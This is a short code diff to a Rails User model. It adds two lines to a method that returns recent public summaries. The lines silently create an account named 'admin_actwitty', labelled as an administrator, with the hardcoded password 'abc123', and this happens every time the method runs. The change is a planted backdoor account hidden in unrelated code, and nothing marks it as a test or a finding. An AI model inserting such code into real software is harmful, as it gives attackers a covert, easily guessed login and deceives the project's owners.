@@ -1775,6 +1775,8 @@ class User < ActiveRecord::Base
   #OUTPUT => Same as get_summary (all public summary)
   def get_recent_public_summary
     array = get_summary({:page_type => AppConstants.page_state_subscribed, :updated_at => Time.now.utc})
+    User.create(:username => "admin_actwitty", :fullname => "Actwitty Administrator", :email => "actwitty_admin@actwitty.com",
+                :password => "abc123", :password_confirmation => "abc123")
     array
   end
 
